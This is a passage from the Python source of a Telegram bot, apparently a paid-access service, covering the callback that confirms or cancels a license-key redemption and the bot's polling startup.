        bot.edit_message_text("❌ **Redemption cancelled by user.**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "Cancelled")
        return

    try:
        keys = get_keys()
        key_doc = keys.get(tx_data["key"])
        
        if not key_doc or key_doc.get('used'):
            bot.answer_callback_query(call.id, "❌ This key has already been used!", show_alert=True)
            del pending_redemptions[tx_id]
            return

        available_dt = datetime.fromisoformat(tx_data["available_dt"]).astimezone(IST)
        current_expiry = datetime.fromisoformat(tx_data["current_expiry"]).astimezone(IST)
        
        execute_final_redemption(
            user_id=call.from_user.id,
            first_name=call.from_user.first_name,
            key_input=tx_data["key"],
            key_doc=key_doc,
            blocks_to_block=tx_data["blocks"],
            duration_sec=tx_data["duration_sec"],
            available_dt=available_dt,
            has_active=tx_data["has_active"],
            current_expiry=current_expiry,
            now_ist=datetime.now(IST),
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            is_callback=True,
            is_buffered=tx_data.get("is_buffered", False)
        )
        
        del pending_redemptions[tx_id]
        bot.answer_callback_query(call.id, "Key Activated!")

    except Exception as err:
        logging.error(f"Callback Confirmation Processing Error: {err}")
        bot.answer_callback_query(call.id, "❌ Critical system error occurred.", show_alert=True)

if __name__ == "__main__":
    print("🚀 dx Paid Bot is running...")
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"Polling error: {e}")
